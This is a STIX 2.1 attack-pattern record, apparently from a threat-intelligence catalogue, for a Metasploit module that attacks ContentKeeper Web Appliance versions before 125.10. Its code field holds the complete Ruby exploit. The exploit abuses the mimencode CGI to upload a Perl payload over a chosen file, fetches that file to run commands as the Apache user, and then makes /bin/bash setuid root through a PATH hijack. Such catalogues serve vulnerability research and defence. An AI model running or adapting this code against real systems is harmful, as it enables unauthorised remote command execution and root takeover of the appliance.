{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--32fb100b-afe3-4923-841b-e39f9c4e0fcd",
    "created": "2024-08-14T17:14:47.857952Z",
    "modified": "2024-08-14T17:14:47.857956Z",
    "name": "ContentKeeper Web Remote Command Execution",
    "description": " This module exploits the ContentKeeper Web Appliance. Versions prior to 125.10 are affected. This module exploits a combination of weaknesses to enable remote command execution as the Apache user. By setting SkipEscalation to false, this module will attempt to setuid the bash shell. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/contentkeeperweb_mimencode.rb",
            "external_id": "contentkeeperweb_mimencode.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.aushack.com/200904-contentkeeper.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'\t\t   => 'ContentKeeper Web Remote Command Execution',\n      'Description'  => %q{\n          This module exploits the ContentKeeper Web Appliance. Versions prior\n        to 125.10 are affected. This module exploits a combination of weaknesses\n        to enable remote command execution as the Apache user. By setting\n        SkipEscalation to false, this module will attempt to setuid the bash shell.\n      },\n      'Author' \t   => [ 'aushack' ],\n      'Arch'\t\t   => [ ARCH_CMD ],\n      'License'      => MSF_LICENSE,\n      'References'   =>\n        [\n          [ 'OSVDB', '54551' ],\n          [ 'OSVDB', '54552' ],\n          [ 'URL', 'http://www.aushack.com/200904-contentkeeper.txt' ],\n        ],\n      'Privileged'\t=> false,\n      'Payload'      =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Platform'     => ['unix'],\n      'Targets'      =>\n        [\n          [ 'Automatic', { } ]\n        ],\n      'DisclosureDate' => '2009-02-25',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        Opt::RPORT(80),\n        OptString.new('OVERWRITE', [ true,  \"The target file to upload our payload (spamkeeper.dat, bak.txt, formdate.pl etc)\", 'spamkeeper.dat']),\n        OptBool.new(\"SkipEscalation\", [true, \"Specify this to skip the root escalation attempt\", false]),\n      ])\n  end\n\n  def check\n    connect\n    sock.put(\"GET /cgi-bin/ck/mimencode HTTP/1.0\\r\\n\\r\\n\")\n    banner = sock.get_once(-1, 3)\n    disconnect\n\n    if (banner =~ /500 Internal/)\n      return Exploit::CheckCode::Vulnerable\n    end\n      return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    exp = \"#!/usr/bin/perl\\n\"\n    exp << \"print \\\"Content-type: text/html\\\\n\\\\n\\\"\\;\\n\\n\"\n    exp << \"use IO::Socket::INET;\\n\"\n\n    if (datastore['PAYLOAD'] =~ /perl/)\n      if not datastore['SkipEscalation']\n        print_status(\"Attempting to facilitate root escalation...\")\n        exp << %q{ system(\"echo /bin/chmod u+s /bin/bash > ps; /bin/chmod o+x ps; PATH=.:$PATH; ./benetool stopall;\"); } # We can use either 'ps' or 'grep' but ps is fine.\n      end\n      exp << payload.encoded.gsub('perl -MIO -e ', '').gsub('\\'', '') # We're already inside a perl script!\n    else\n      exp << \"system(\\\"\"\n      exp << payload.encoded.gsub('\"', '\\\"')\n      exp << \"\\\");\\n\"\n    end\n\n    body = Rex::Text.encode_base64(exp)\n\n    connect\n\n    sploit = \"POST /cgi-bin/ck/mimencode?-u+-o+#{datastore['OVERWRITE']} HTTP/1.1\\r\\n\"\n    sploit << \"Host: #{datastore['RHOST']}\\r\\n\"\n    sploit << \"Content-Length: #{body.length}\\r\\n\\r\\n\"\n\n    print_status(\"Uploading payload to target...\")\n    sock.put(sploit + body + \"\\r\\n\\r\\n\")\n    disconnect\n\n    select(nil,nil,nil,3) # Wait a few seconds..\n    print_status(\"Calling payload...\")\n    connect\n    req = \"GET /cgi-bin/ck/#{datastore['OVERWRITE']} HTTP/1.1\\r\\n\" # Almost all files are owned by root, chmod'ed 777 :) rwx\n    req << \"Host: #{datastore['RHOST']}\\r\\n\"\n    sock.put(req + \"\\r\\n\\r\\n\")\n\n    handler\n    disconnect\n    select(nil,nil,nil,3) # Wait for session creation.\n    if not datastore['SkipEscalation'] and session_created? and datastore['PAYLOAD'] =~ /perl/\n      print_status(\"Privilege escalation appears to have worked!\")\n      print_status(\"/bin/bash is now root setuid! Type 'bash -p' to get root.\")\n      print_status(\"Don't forget to clean up afterwards (chmod -s /bin/bash and restore an original copy of the OVERWRITE file).\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-02-25",
    "x_mitre_platforms": [
        "['unix']"
    ]
}